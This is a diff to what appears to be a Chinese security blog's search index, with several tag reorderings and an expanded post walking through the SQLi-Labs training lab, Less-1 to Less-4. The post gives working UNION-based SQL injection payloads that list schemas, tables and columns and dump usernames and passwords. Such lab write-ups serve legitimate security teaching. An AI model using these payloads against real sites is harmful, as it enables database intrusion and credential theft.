@@ -75,15 +75,15 @@
       <tags>
         <tag>kali Linux</tag>
         <tag>攻击测试</tag>
-        <tag>Ettercap</tag>
         <tag>Metasploit</tag>
+        <tag>Ettercap</tag>
         <tag>browser_autopwn2</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[SQLi-Labs第一章（未完）]]></title>
     <url>%2Fsqli-libs-first%2F</url>
-    <content type="text"><![CDATA[前言 注入过程 一. 前言1. 什么是SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 第一章的22关会慢慢更新，有时间就写。 二. 注入过程测试环境 MySQL 5.5.53 PHP 5.6.27-nts Apache 2.4 Less-11）首先进入SQLi-Labs，选择第一题 2）在地址后输入?id=1，发现可以显示用户信息，说明不是数值查询 3）接下来尝试修改修改id值，发现一直到12都可以显示信息 4）在地址后输入?id=1&#39;，发现返回错误信息，表示存在SQL字符注入 5）将参数改为?id=1&#39; --+，发现返回信息正常，则说明是单引号字符型注入 6）使用order by判断行数，当行数增加到4时返回错误信息，说明共有3列数据 7）将id=1改为一个数据库不存在的id值，使用union select 1,2,3联合查询语句查看页面是否有显示位 可以看到，返回了2和3两个值，说明有两个显示位 8）利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息 1?id=15&apos; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+ 9）查询security内的所有表名 1?id=15&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),3 --+ 10）爆破user表的列名 1?id=15&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;) --+ 可以看到列表名为id、username和password 11）最后查询所有的用户名和密码 1?id=15&apos; union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+ Less-2同样的我们先输入参数?id=1 将参数改为?id=1&#39;后报错 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1 意思是单引号破坏了查询导致了错误，所以说，查询代码使用了整数。可以使用?id=1--+来注释掉剩余查询 查看代码可以看到具体的查询语句如下 1$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1"; 使用以下payload均显示正常 12?id=1--+ or 1=1?id=1 or 1=1 --+ 其余步骤与Less-1相同]]></content>
+    <content type="text"><![CDATA[前言 注入过程 一. 前言1. 什么是SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 第一章的22关会慢慢更新，有时间就写。 二. 注入过程测试环境 MySQL 5.5.53 PHP 5.6.27-nts Apache 2.4 Less-11）首先进入SQLi-Labs，选择第一题 2）在地址后输入?id=1，发现可以显示用户信息，说明不是数值查询 3）接下来尝试修改修改id值，发现一直到12都可以显示信息 4）在地址后输入?id=1&#39;，发现返回错误信息，表示存在SQL字符注入 5）将参数改为?id=1&#39; --+，发现返回信息正常，则说明是单引号字符型注入 6）使用order by判断行数，当行数增加到4时返回错误信息，说明共有3列数据 7）将id=1改为一个数据库不存在的id值，使用union select 1,2,3联合查询语句查看页面是否有显示位 可以看到，返回了2和3两个值，说明有两个显示位 8）利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息 1?id=15&apos; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+ 9）查询security内的所有表名 1?id=15&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),3 --+ 10）爆破user表的列名 1?id=15&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;) --+ 可以看到列表名为id、username和password 11）最后查询所有的用户名和密码 1?id=15&apos; union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+ Less-2同样的我们先输入参数?id=1 将参数改为?id=1&#39;后报错 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1 意思是单引号破坏了查询导致了错误，所以说，查询代码使用了整数。可以使用?id=1--+来注释掉剩余查询 查看代码可以看到具体的查询语句如下 1$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1"; 使用以下payload均显示正常 12?id=1--+ or 1=1?id=1 or 1=1 --+ 可以使用如下payload获得显示位 其余步骤与Less-1相同 Less-3使用参数?id=1&#39; 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1 猜测使用的是如下SQL语句 1Select login_name, select password from table where id= ('our input here') 使用参数?id=1)--+ 可以看到显示正常，说明猜测是正确的，查看源代码发现语句如下 1$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1"; 使用如下payload同样可以 1?id=&apos;) or &apos;1&apos;=(&apos;1 获得显示位 Less-4使用参数?id=1&quot;时报错 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1 猜测id被括号_()_和_””_所包装 使用参数?id=1&quot;) --+，可以看到显示正常 查看源代码，可以看到语句如下 12$id = '"' . $id . '"';$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1"; 使用如下payload 12?id=&quot;) or &quot;1&quot;=(&quot;1?id=&quot;) or 1=1--+ 获得显示位]]></content>
       <categories>
         <category>SQL注入</category>
       </categories>
@@ -102,8 +102,8 @@
         <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>环境搭建</tag>
         <tag>SQL注入</tag>
+        <tag>环境搭建</tag>
         <tag>SQLi-Labs</tag>
       </tags>
   </entry>
@@ -127,10 +127,10 @@
         <category>工具使用</category>
       </categories>
       <tags>
+        <tag>kali Linux</tag>
         <tag>Social-Engineer-Toolkit</tag>
         <tag>钓鱼网站</tag>
         <tag>社工</tag>
-        <tag>kali Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -154,9 +154,9 @@
         <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>kali Linux</tag>
         <tag>环境搭建</tag>
         <tag>Shellinabox</tag>
+        <tag>kali Linux</tag>
         <tag>Ngrok</tag>
       </tags>
   </entry>
